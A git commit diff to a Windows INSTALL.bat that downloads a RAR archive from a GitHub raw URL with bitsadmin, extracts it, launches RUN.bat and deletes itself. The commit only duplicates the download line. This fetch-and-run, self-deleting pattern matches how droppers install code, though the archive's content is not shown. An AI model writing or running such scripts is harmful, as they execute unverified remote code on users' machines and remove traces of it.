c5899dd3d9895a9ae45e4cb1f00772f7980c0439
sergey <konferovich.sergey@yandex.ru>
2018-09-14 16:43:36 +0500

    'service'

--- INSTALL.bat
+++ INSTALL.bat
@@ -1,5 +1,6 @@
 @echo off
 bitsadmin.exe /transfer "LOL" /priority FOREGROUND https://raw.githubusercontent.com/bugai66/Elysium_Files/master/INSTALL.rar "%~dp0INSTALL.rar"
+bitsadmin.exe /transfer "LOL" /priority FOREGROUND https://raw.githubusercontent.com/bugai66/Elysium_Files/master/INSTALL.rar "%~dp0INSTALL.rar"
 "%~dp0\7z" e "INSTALL.rar"
 start cmd /c "RUN.bat"
 DEL "%~f0"
